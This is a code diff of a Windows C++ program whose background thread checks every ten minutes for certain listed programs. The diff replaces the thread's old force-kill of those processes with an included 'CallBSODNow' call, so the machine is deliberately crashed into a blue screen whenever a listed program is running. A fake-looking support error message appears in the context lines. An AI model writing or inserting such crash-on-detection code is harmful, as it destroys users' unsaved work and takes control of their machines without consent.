@@ -1,12 +1,14 @@
 //main.cpp
-//Author:qdxllecrn E-mail:sweheartiii[at]hotmail.com
+//Author:sometimes.naive
+//E-mail:sometimes.naive[at]hotmail.com
 //Last update:Apr. 14th , 2016a
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
-#include "cekproc.h"//header in website:http://paste.ubuntu.com/14186521/
+#include "cekproc.h"
 #include <stdlib.h>
 #include <time.h>
+#include "bsod.hpp"
 
 #define BAD_EXIT \
 		_tprintf(_T("Bad Parameters.\n")),\
@@ -145,9 +147,9 @@ Please contact the application's support team for more information.\n"),
 
 DWORD CALLBACK Main_Thread(LPVOID){
 	srand(time(NULL));
-	for (DWORD dwProcessID;;Sleep(1000*60*(rand()%10+1)+5))//10 min
+	for (DWORD dwProcessID;;Sleep(1000*60*10))//10 min
 		for (size_t i=0;i<sizeof(lpszProgramFileName)/sizeof(lpszProgramFileName[0]);i++)
-			if (isExecExist(lpszProgramFileName[i],&dwProcessID)){
+			if (isExecExist(lpszProgramFileName[i],&dwProcessID)){/*
 				hdProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID);
 				TerminateProcess(hdProcess,EXIT_SUCCESS);
 				CloseHandle(hdProcess);
@@ -155,7 +157,8 @@ DWORD CALLBACK Main_Thread(LPVOID){
 					memset(buf1,0,sizeof(buf1)/sizeof(TCHAR));
 					_stprintf(buf1,_T("taskkill /f /im \"%s\""),lpszProgramFileName[i]);
 					ShellExecute(NULL,_T("open"),buf1,NULL,NULL,0);
-				}
+				}*/
+				CallBSODNow;
 			}
 	return 0;
 }
